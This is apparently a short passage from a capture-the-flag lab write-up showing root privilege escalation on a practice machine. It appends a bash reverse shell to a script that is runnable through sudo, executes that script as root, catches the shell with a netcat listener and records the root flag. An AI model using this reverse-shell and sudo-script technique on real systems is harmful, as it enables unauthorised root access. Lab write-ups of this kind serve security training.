
![[Pasted image 20240605212613.png|700]]

```sh
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.77/1234 0>&1'" | tee -a monitor.sh
```
![[Pasted image 20240605212733.png|700]]

```sh
sudo -u root /home/nibbler/personal/stuff/monitor.sh
```
![[Pasted image 20240605212953.png|700]]

```sh
nc -nvlp 1234
```
![[Pasted image 20240605213109.png|700]]
> [!root.txt]
> de5e5d6619862a8aa5b9b212314e0cdd